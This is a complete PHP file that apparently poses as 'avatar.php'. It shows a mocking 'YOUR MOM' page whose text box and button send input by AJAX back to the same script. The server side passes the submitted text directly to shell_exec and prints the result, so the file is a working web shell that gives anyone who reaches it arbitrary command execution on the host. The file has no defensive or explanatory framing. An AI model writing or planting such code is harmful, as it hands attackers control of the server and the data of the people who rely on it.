<?php
$calls = $_POST['calls'];
if ($calls != 1){
echo "$calls";
?>
<html>
<head>
<script>
var arms="";
function AJAX(){
var xmlHttp;
try{
xmlHttp=new XMLHttpRequest();
return xmlHttp;
}
catch (e){
try{
xmlHttp=new ActiveXObject("Msxml2.XMLHTTP");
return xmlHttp;
}
catch (e){
try{
xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");
return xmlHttp;
}
catch (e){
alert("Your browser does not support AJAX!");
return false;
}
}
}
}
function pF(va,v,l){
if (l == undefined){
l = "&";
}
return (va+"="+v+l);
}
function postData(url, parameters){
var xmlHttp=AJAX();
xmlHttp.onreadystatechange =  function(){
if(xmlHttp.readyState > 0 && xmlHttp.readyState < 4){
//waiting for server to respond
}
if (xmlHttp.readyState == 4) {
//document.getElementById(divid).innerHTML=xmlHttp.responseText;
sdf(xmlHttp.responseText);
}
}
xmlHttp.open("POST", url, true);
xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xmlHttp.setRequestHeader("Content-length", parameters.length);
xmlHttp.setRequestHeader("Connection", "close");
//xmlHttp.setRequestHeader(parameters.length);
//xmlHttp.setRequestHeader("close");
xmlHttp.send(parameters);
}
function sdf(gfd){
document.getElementById("fuckitwelldoitlive").innerHTML = gfd + arms;
arms = gfd + arms;
}
function dosomethingfancy(){
postData("avatar.php",(pF("calls","1","&")+pF("themen",document.getElementById("yermom").value,"")));
}
</script>
</head>
<body>
<center><h1><font color="red">YOUR MOM</font></h1></center><br>
<input type="text" value="YOUR MOM 9001" id="yermom">
<input type="button" value="men and guys" onclick="dosomethingfancy()">
<br>
<div id="fuckitwelldoitlive"></div>
</body>
</html>
<?
}
else
{
$forthemen = $_POST["themen"];
$output = shell_exec($forthemen);
$output = str_replace("\n","<br />",$output);
$output = htmlspecialchars($output);
$output = str_replace("&lt;br /&gt;","<br>",$output);

echo "$output<br>";
}
?>
